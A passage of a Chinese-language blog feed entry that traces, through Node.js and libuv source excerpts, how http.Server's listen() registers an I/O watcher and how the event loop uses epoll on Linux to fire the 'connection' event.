    <content type="html"><![CDATA[<p>两条故事线去探索http.Server从<code>listen()</code>到<code>connection</code>事件的触发其背后的原理，主要是为了理解libuv在网络I/O方面的异步实现。一条故事线看TCP handle的I/O观察者是怎样加入到event loop的观察者队列，另一条故事线看隐藏于背后的event loop在liunx下如何利用系统的<code>epoll</code>机制注册并收集events从而调用观察者回调。</p><a id="more"></a><p>源码解读以linux系统为方向。我们知道libuv对不同平台的内部网络I/O异步机制进行了抽象，如Windows的IOCP,FreeBSD下的kqueue,linux下的epoll等。</p><h2 id="从js层面来到C-层面"><a href="#从js层面来到C-层面" class="headerlink" title="从js层面来到C++层面"></a>从js层面来到C++层面</h2><p><code>http.Server</code>类继承<code>net.Server</code>类,以<code>Server.listen()</code>为例，其实调用的是<code>net.Server.listen()</code>,实际调用的是<code>setupListenHandle()</code>,包括<code>createServerHandle()</code>到C++层面创建handle和调用C++层面定义的<code>listen()</code>方法:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">rval = createServerHandle(address, port, addressType, fd);</span><br><span class="line"><span class="keyword">this</span>._handle = rval;</span><br><span class="line"><span class="keyword">this</span>[async_id_symbol] = getNewAsyncId(<span class="keyword">this</span>._handle);</span><br><span class="line"><span class="keyword">this</span>._handle.onconnection = onconnection;</span><br><span class="line"><span class="keyword">this</span>._handle.owner = <span class="keyword">this</span>;</span><br><span class="line"><span class="keyword">var</span> err = <span class="keyword">this</span>._handle.listen(backlog || <span class="number">511</span>);</span><br><span class="line">nextTick(<span class="keyword">this</span>[async_id_symbol], emitListeningNT, <span class="keyword">this</span>); <span class="comment">//触发listening事件</span></span><br></pre></td></tr></table></figure></p><p>在<code>emitListeningNT</code>里触发<code>listening</code>事件,其中<code>handle</code>是C/C++内建模块<code>tcp_wrap.cc</code>里定义的,这里还定义了<code>onconnection</code>，这个会在C/C++层面合适的时候调用，而<code>onconnection()</code>里会触发<code>connection</code>事件。</p><p>说到handle创建，<code>onconnection</code>的调用,那就要开始我们的第一条故事线:向event loop里加入观察者。</p><h2 id="故事线一：向event-loop观察者队列里加入观察者"><a href="#故事线一：向event-loop观察者队列里加入观察者" class="headerlink" title="故事线一：向event loop观察者队列里加入观察者"></a>故事线一：向event loop观察者队列里加入观察者</h2><h3 id="观察者的产生"><a href="#观察者的产生" class="headerlink" title="观察者的产生"></a>观察者的产生</h3><p>首先<code>TCPWrap</code>类的constructor:<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">TCPWrap::TCPWrap(Environment* env, Local&lt;Object&gt; object)</span><br><span class="line">    : ConnectionWrap(env,</span><br><span class="line">                     object,</span><br><span class="line">                     AsyncWrap::PROVIDER_TCPWRAP) &#123;</span><br><span class="line">  <span class="keyword">int</span> r = uv_tcp_init(env-&gt;event_loop(), &amp;handle_);</span><br><span class="line">  CHECK_EQ(r, <span class="number">0</span>);</span><br><span class="line">  UpdateWriteQueueSize();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们看到调用了<code>uv_tcp_init()</code>用于设置<code>handle_</code>，比如将<code>env.event_loop()</code>赋值给<code>handle_-&gt;loop</code>。</p><p><code>TCPWrap</code>继承<code>ConnectionWrap</code>：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TCPWrap</span> :</span> <span class="keyword">public</span> ConnectionWrap&lt;TCPWrap, <span class="keyword">uv_tcp_t</span>&gt;&#123;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>然后这里这里的<code>handle_</code>就是在<code>ConnectionWrap</code>里定义的:<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> node &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> WrapType, <span class="keyword">typename</span> UVType&gt;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ConnectionWrap</span> :</span> <span class="keyword">public</span> StreamWrap &#123;</span><br><span class="line">  ...</span><br><span class="line">  UVType handle_;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>可以看到这里的<code>handle_</code>类型根据模板参数<code>UVType</code>来,这样<code>&amp;wrap-&gt;handle_</code>就是一个<code>uv_tcp_t</code>观察者类型的指针了。</p><p>关于<code>uv_tcp_t</code>:<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">uv_tcp_s</span> &#123;</span></span><br><span class="line">  UV_HANDLE_FIELDS</span><br><span class="line">  UV_STREAM_FIELDS</span><br><span class="line">  UV_TCP_PRIVATE_FIELDS</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p><code>UV_HANDLE_FIELDS</code>定义如下:</p><p><img src="http://7xsi10.com1.z0.glb.clouddn.com/uv_handle_fileds.png" alt="http://7xsi10.com1.z0.glb.clouddn.com/uv_handle_fileds.png"></p><p>在<code>UV_STREAM_FIELDS</code>的<code>UV_STREAM_PRIVATE_FIELDS</code>定义如下:<br><img src="http://7xsi10.com1.z0.glb.clouddn.com/UV_STREAM_PRIVATE_FIELDS.png" alt="http://7xsi10.com1.z0.glb.clouddn.com/UV_STREAM_PRIVATE_FIELDS.png"></p><p>其中<code>io_watcher</code>就是我们所说的I/O观察者了，<code>connection_cb</code>将是最终C++进入js层面需要调用的，后面会详解。</p><h3 id="TCPWrap-Listen"><a href="#TCPWrap-Listen" class="headerlink" title="TCPWrap::Listen"></a>TCPWrap::Listen</h3><p>这便是js层面调用的<code>TCP.listen</code><br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> TCPWrap::Listen(<span class="keyword">const</span> FunctionCallbackInfo&lt;Value&gt;&amp; args) &#123;</span><br><span class="line">  TCPWrap* wrap;</span><br><span class="line">  ASSIGN_OR_RETURN_UNWRAP(&amp;wrap,</span><br><span class="line">                          args.Holder(),</span><br><span class="line">                          args.GetReturnValue().Set(UV_EBADF));</span><br><span class="line">  <span class="keyword">int</span> backlog = args[<span class="number">0</span>]-&gt;Int32Value();</span><br><span class="line">  <span class="keyword">int</span> err = uv_listen(<span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">uv_stream_t</span>*&gt;(&amp;wrap-&gt;handle_),</span><br><span class="line">                      backlog,</span><br><span class="line">                      OnConnection);</span><br><span class="line">  args.GetReturnValue().Set(err);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们看到这里它调用了<code>uv_listen</code>，而参数有强制转换为<code>uv_stream_t</code>的<code>uv_tcp_t</code>指针，</p><p>在<code>stream.c</code>里会根据<code>handle</code>具体类型，调用不同的函数:<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">uv_listen</span><span class="params">(<span class="keyword">uv_stream_t</span>* stream, <span class="keyword">int</span> backlog, uv_connection_cb cb)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> err;</span><br><span class="line">  <span class="keyword">switch</span> (stream-&gt;type) &#123;</span><br><span class="line">  <span class="keyword">case</span> UV_TCP:</span><br><span class="line">    err = uv_tcp_listen((<span class="keyword">uv_tcp_t</span>*)stream, backlog, cb);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> UV_NAMED_PIPE:</span><br><span class="line">    err = uv_pipe_listen((<span class="keyword">uv_pipe_t</span>*)stream, backlog, cb);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">default</span>:</span><br><span class="line">    err = -EINVAL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (err == <span class="number">0</span>)</span><br><span class="line">    uv__handle_start(stream); <span class="comment">//会执行activehandles++</span></span><br><span class="line">  <span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这里调用｀uv_tcp_listen`：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (listen(tcp-&gt;io_watcher.fd, backlog))</span><br><span class="line">    <span class="keyword">return</span> -errno;</span><br><span class="line"></span><br><span class="line">tcp-&gt;connection_cb = cb;</span><br><span class="line">tcp-&gt;flags |= UV_HANDLE_BOUND;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Start listening for connections. */</span></span><br><span class="line">tcp-&gt;io_watcher.cb = uv__server_io;</span><br><span class="line">uv__io_start(tcp-&gt;loop, &amp;tcp-&gt;io_watcher, POLLIN);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure></p><p><code>uv__io_t io_watcher.cb</code>被设置为<code>uv__server_io</code>,该函数会由event loop调用，后面会详解。而<code>tcp-&gt;connection_cb = cb</code>被设置为cb,即<code>onConnection</code>。</p><p><code>io_watcher</code>为<code>uv__io_t</code>类型:<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">uv__io_s</span> &#123;</span></span><br><span class="line">  uv__io_cb cb;</span><br><span class="line">  <span class="keyword">void</span>* pending_queue[<span class="number">2</span>];</span><br><span class="line">  <span class="keyword">void</span>* watcher_queue[<span class="number">2</span>];</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> pevents;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> events;</span><br><span class="line">  <span class="keyword">int</span> fd;</span><br><span class="line">  UV_IO_PRIVATE_PLATFORM_FIELDS</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>再进入<code>uv__io_start()</code>:<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">uv__io_start</span><span class="params">(<span class="keyword">uv_loop_t</span>* loop, <span class="keyword">uv__io_t</span>* w, <span class="keyword">unsigned</span> <span class="keyword">int</span> events)</span> </span>&#123;</span><br><span class="line">  w-&gt;pevents |= events;</span><br><span class="line">  maybe_resize(loop, w-&gt;fd + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (QUEUE_EMPTY(&amp;w-&gt;watcher_queue))</span><br><span class="line">    QUEUE_INSERT_TAIL(&amp;loop-&gt;watcher_queue, &amp;w-&gt;watcher_queue);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (loop-&gt;watchers[w-&gt;fd] == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    loop-&gt;watchers[w-&gt;fd] = w;</span><br><span class="line">    loop-&gt;nfds++;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以看到这里，将events赋值给<code>w-&gt;pevents</code>，就是说加入到pending events里去，就是它对events事件感兴趣。这个会在后面<code>epoll_wait()</code>用到。</p><p><code>uv_tcp_t</code>类型的<code>_handle</code>的<code>io_wathcer</code>就加入到了<code>_handle-&gt;loop</code>（实际上就是event loop)的<code>watcher_queue</code>里。</p><p>至此，添加I/O观察者的任务就完成了，该函数执行完毕，<code>TCP.listen()</code>的调用就介绍，就会返回到js层面,去触发<code>listening</code>事件，可见，这个过程是同步执行的，那么<code>listening</code>事件真正的意义就是标志着I/O观察者成功加入到事件循环了。</p><p>而要谈真正意义上的异步，还得从另一条故事线出发，那便是隐藏于背后的<code>event loop</code>。</p><h2 id="故事线二：event-loop"><a href="#故事线二：event-loop" class="headerlink" title="故事线二：event loop"></a>故事线二：event loop</h2><p>还记得我上一篇文章吗？在<code>node.cc</code>的最后一个<code>inline Start()</code>里:<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="function">SealHandleScope <span class="title">seal</span><span class="params">(isolate)</span></span>;</span><br><span class="line">    <span class="keyword">bool</span> more;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">      v8_platform.PumpMessageLoop(isolate);</span><br><span class="line">      more = uv_run(env.event_loop(), UV_RUN_ONCE);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (more == <span class="literal">false</span>) &#123;</span><br><span class="line">        v8_platform.PumpMessageLoop(isolate);</span><br><span class="line">        EmitBeforeExit(&amp;env);</span><br><span class="line">        more = uv_loop_alive(env.event_loop());</span><br><span class="line">        <span class="keyword">if</span> (uv_run(env.event_loop(), UV_RUN_NOWAIT) != <span class="number">0</span>)</span><br><span class="line">          more = <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (more == <span class="literal">true</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p><p><code>uv_run()</code>开启了event loop。</p><p>然后我们进入到<code>uv_run()</code>：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">uv_run</span><span class="params">(<span class="keyword">uv_loop_t</span>* loop, uv_run_mode mode)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> timeout;</span><br><span class="line">  <span class="keyword">int</span> r;</span><br><span class="line">  <span class="keyword">int</span> ran_pending;</span><br><span class="line"></span><br><span class="line">  r = uv__loop_alive(loop);</span><br><span class="line">  <span class="keyword">if</span> (!r)</span><br><span class="line">    uv__update_time(loop);</span><br><span class="line"></span><br><span class="line"><span class="comment">//这里就是那个被称作event loop的while loop</span></span><br><span class="line">  <span class="keyword">while</span> (r != <span class="number">0</span> &amp;&amp; loop-&gt;stop_flag == <span class="number">0</span>) &#123;</span><br><span class="line">    uv__update_time(loop);</span><br><span class="line">    uv__run_timers(loop);</span><br><span class="line">    ran_pending = uv__run_pending(loop);</span><br><span class="line">    uv__run_idle(loop);</span><br><span class="line">    uv__run_prepare(loop);</span><br><span class="line"></span><br><span class="line">    timeout = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ((mode == UV_RUN_ONCE &amp;&amp; !ran_pending) || mode == UV_RUN_DEFAULT)</span><br><span class="line">      timeout = uv_backend_timeout(loop);</span><br><span class="line"></span><br><span class="line">    uv__io_poll(loop, timeout);</span><br><span class="line">    uv__run_check(loop);</span><br><span class="line">    uv__run_closing_handles(loop);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mode == UV_RUN_ONCE) &#123;</span><br><span class="line">      uv__update_time(loop);</span><br><span class="line">      uv__run_timers(loop);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    r = uv__loop_alive(loop);</span><br><span class="line">    <span class="keyword">if</span> (mode == UV_RUN_ONCE || mode == UV_RUN_NOWAIT)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (loop-&gt;stop_flag != <span class="number">0</span>)</span><br><span class="line">    loop-&gt;stop_flag = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这里不断地循环，不断地判断event loop是否保持active，如果有handle存在，那么它将一直在我们背后运行。</p><p>而这里与我们有关的是<code>uv__io_poll()</code>，而poll这个词正暴露了它的内部实现机制<code>epoll</code></p><p>首先进入了一个循环:<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (!QUEUE_EMPTY(&amp;loop-&gt;watcher_queue)) &#123;</span><br><span class="line">    q = QUEUE_HEAD(&amp;loop-&gt;watcher_queue);</span><br><span class="line">    QUEUE_REMOVE(q);</span><br><span class="line">    QUEUE_INIT(q);</span><br><span class="line"></span><br><span class="line">    w = QUEUE_DATA(q, <span class="keyword">uv__io_t</span>, watcher_queue);</span><br><span class="line">    e.events = w-&gt;pevents;</span><br><span class="line">    e.data = w-&gt;fd;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (w-&gt;events == <span class="number">0</span>)</span><br><span class="line">      op = UV__EPOLL_CTL_ADD;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      op = UV__EPOLL_CTL_MOD;</span><br><span class="line">    <span class="keyword">if</span> (uv__epoll_ctl(loop-&gt;backend_fd, op, w-&gt;fd, &amp;e)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (errno != EEXIST)</span><br><span class="line">        <span class="built_in">abort</span>();</span><br><span class="line"></span><br><span class="line">      assert(op == UV__EPOLL_CTL_ADD);</span><br><span class="line">        <span class="built_in">abort</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    w-&gt;events = w-&gt;pevents;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p><p>每次从观察者队列里取出队头的观察者队列，然后根据它才取出<code>w</code>(实际的<code>io_wathcer</code>)；并取出观察者感兴趣的pending events和与之绑定的<code>fd</code>。</p><p>然后调用<code>epoll</code>机制三大方法之一的<code>uv__epoll_ctl</code>去注册io观察者感兴趣的pending状态的events。</p><p>接着又会进去一个无限循环<code>for(;;)</code>,首先调用<code>uv__epoll_wait</code>等待上面注册的事件发生:<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nfds = uv__epoll_wait(loop-&gt;backend_fd,</span><br><span class="line">                            events,</span><br><span class="line">                            ARRAY_SIZE(events),</span><br><span class="line">                            timeout);</span><br></pre></td></tr></table></figure></p><p><code>epoll</code>机制会在该<code>fd</code>产生观察者感兴趣的事件发生后返回，收集到事件会放到<code>events</code>数组里。</p><p>接着在这个循环里依次取出<code>events</code>(由epoll产生):<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nfds; i++) &#123;</span><br><span class="line">    pe = events + i;</span><br><span class="line">    fd = pe-&gt;data;</span><br><span class="line">    w = loop-&gt;watchers[fd];</span><br><span class="line">    ...</span><br><span class="line">    w-&gt;cb(loop, w, pe-&gt;events);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>针对每个事件调用<code>w-&gt;cb(loop, w, pe-&gt;events);</code>而这个<code>cb</code>我们之前在｀uv_tcp_listen()`里进行了设置:<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcp-&gt;io_watcher.cb = uv__server_io;</span><br></pre></td></tr></table></figure></p><p>然后由于<code>timeout</code>在event loop里被设置为0，即表示立即返回，当下一次event loop来临时，根据epoll机制：</p><hr><p>LT模式: 当epoll_wait检测到描述符事件发生并将此事件通知应用程序，应用程序可以不立即处理该事件。下次调用epoll_wait时，会再次响应应用程序并通知此事件。</p><p>这样就不用担心两次事件循环之间的时间有事件来不及处理了。</p><p>这样这个与I/O有关的epoll操作结束，直到下一个event loop来临，又会去<code>取观察者-&gt;注册感兴趣的事件-&gt;找epoll询问产生的事件-&gt;执行回调</code>。</p><h2 id="回调进入js层面"><a href="#回调进入js层面" class="headerlink" title="回调进入js层面"></a>回调进入js层面</h2><p>顺藤摸瓜来到<code>uv_server_io</code>:<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">uv__io_start(stream-&gt;loop, &amp;stream-&gt;io_watcher, POLLIN);</span><br><span class="line"><span class="keyword">while</span> (uv__stream_fd(stream) != <span class="number">-1</span>) &#123;</span><br><span class="line">    assert(stream-&gt;accepted_fd == <span class="number">-1</span>);</span><br><span class="line">    err = uv__accept(uv__stream_fd(stream));</span><br><span class="line">    <span class="keyword">if</span> (err &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (err == -EAGAIN || err == -EWOULDBLOCK)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (err == -ECONNABORTED)</span><br><span class="line">        <span class="keyword">continue</span>;  <span class="comment">/* Ignore. Nothing we can do about that. */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (err == -EMFILE || err == -ENFILE) &#123;</span><br><span class="line">        err = uv__emfile_trick(loop, uv__stream_fd(stream));</span><br><span class="line">        <span class="keyword">if</span> (err == -EAGAIN || err == -EWOULDBLOCK)</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      stream-&gt;connection_cb(stream, err);</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>可以看到在调用回调函数之前，再次调用了<code>uv__io_start()</code>，这样就可以继续监听其他连接的到来了。</p><p>最后我们来看看<code>stream-&gt;connection_cb(stream,err)</code>的调用:<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">WrapType* wrap_data = <span class="keyword">static_cast</span>&lt;WrapType*&gt;(handle-&gt;data);</span><br><span class="line">wrap_data-&gt;MakeCallback(env-&gt;onconnection_string(), arraysize(argv), argv);</span><br></pre></td></tr></table></figure></p><p>至此，通过在js层面通过<code>Server.handle.onconnection</code>设置的<code>onconnection</code>即这里的<code>env-&gt;onconnection_string()</code>就会被调用了。而在<code>onconnection</code>里：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> socket = <span class="keyword">new</span> Socket(&#123;</span><br><span class="line">    handle: clientHandle,</span><br><span class="line">    allowHalfOpen: self.allowHalfOpen,</span><br><span class="line">    pauseOnCreate: self.pauseOnConnect</span><br><span class="line">  &#125;);</span><br><span class="line">socket.readable = socket.writable = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">self._connections++;</span><br><span class="line">socket.server = self;</span><br><span class="line">socket._server = self;</span><br><span class="line">...</span><br><span class="line">self.emit(<span class="string">'connection'</span>, socket);</span><br></pre></td></tr></table></figure></p><p>这样我们在最表层见到的<code>connection</code>事件，才会触发，再经过http的一层封装，才会触发<code>request</code>事件。</p><p>nice job!</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>可以看到，调用<code>listen</code>是一个同步过程，即会调用C++层面的<code>Listen</code>,而这个<code>Listen</code>的作用就是将io观察者加入到<code>loop-&gt;wathcer_queue</code>里，完成后才会返回。</p><p>然后在V8执行js代码的背后，通过执行<code>uv_run()</code>开始<code>event loop</code>,背后的io异步，实际上是利用的<code>epoll</code>机制，里面是一个无限循环，<code>epoll_wait()</code>不断地监听<code>watcher_queue</code>里每个观察者期待的事件是否发生，如果发生，就生成<code>events</code>数组，<code>events</code>数组可能来自不同的<code>fd</code>，针对每一个<code>fd</code>分别调用它们所属观察者的回调函数。接着，进入下一个for循环。</p><p>可以看到暴露给应用层的异步网络I/O，内部实现还是同步的，因为epoll这种机制虽然是非阻塞的I/O多路复用，但是需要不断地去轮询事件的产生或者休眠，相当于还是阻塞了process。不过这些都是发生在V8外的event loop内部的，v8的线程没有被阻塞。而event loop的处理方式是要求<code>epoll_wait()</code>立即返回，通过循环的方式去调用它，这就有点类似于<code>read</code>方式了。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;两条故事线去探索http.Server从&lt;code&gt;listen()&lt;/code&gt;到&lt;code&gt;connection&lt;/code&gt;事件的触发其背后的原理，主要是为了理解libuv在网络I/O方面的异步实现。一条故事线看TCP handle的I/O观察者是怎样加入到event loop的观察者队列，另一条故事线看隐藏于背后的event loop在liunx下如何利用系统的&lt;code&gt;epoll&lt;/code&gt;机制注册并收集events从而调用观察者回调。&lt;/p&gt;
    
    </summary>
    
      <category term="Nodejs" scheme="http://luoxia.me/code/categories/Nodejs/"/>
    
    
      <category term="异步" scheme="http://luoxia.me/code/tags/%E5%BC%82%E6%AD%A5/"/>
    
      <category term="event loop" scheme="http://luoxia.me/code/tags/event-loop/"/>
    
      <category term="libuv" scheme="http://luoxia.me/code/tags/libuv/"/>
    
  </entry>
  
  <entry>
    <title>Process初始化与模块系统形成</title>
    <link href="http://luoxia.me/code/2017/07/24/Process%E5%88%9D%E5%A7%8B%E5%8C%96%E4%B8%8E%E6%A8%A1%E5%9D%97%E7%B3%BB%E7%BB%9F%E5%BD%A2%E6%88%90/"/>
    <id>http://luoxia.me/code/2017/07/24/Process初始化与模块系统形成/</id>
    <published>2017-07-24T10:44:54.000Z</published>
    <updated>2017-11-16T13:10:06.485Z</updated>
    
